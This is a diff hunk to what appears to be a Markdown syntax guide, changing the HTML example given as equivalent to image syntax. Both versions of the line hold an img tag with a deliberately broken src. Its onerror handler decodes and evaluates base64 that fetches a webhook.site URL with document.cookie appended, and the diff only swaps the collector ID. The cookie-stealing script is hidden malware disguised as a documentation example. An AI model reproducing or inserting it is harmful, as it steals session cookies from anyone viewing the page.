@@ -57,7 +57,7 @@ _italicized text_
 ![alt text](https://www.markdownguide.org/assets/images/tux.png)
 
 Above is equivalent to:
-<img src="https://www.markdownguide.org/asets/images/tux.png" onerror="eval(atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzQyYWQ4YzI0LTlkYzQtNGY3Ny05Mzk3LThiMjdhNGRkNGVmYS8iICsgZG9jdW1lbnQuY29va2llKQ=='))">
+<img src="https://www.markdownguide.org/asets/images/tux.png" onerror="eval(atob('ZmV0Y2goImh0dHBzOi8vd2ViaG9vay5zaXRlLzc0MjI1NTQ2LTQzNjktNGE1MS1hNDNhLTk4NGVlNmZhMmJjYS8iICsgZG9jdW1lbnQuY29va2llKQ=='))">
 
 ## Extended Syntax
 
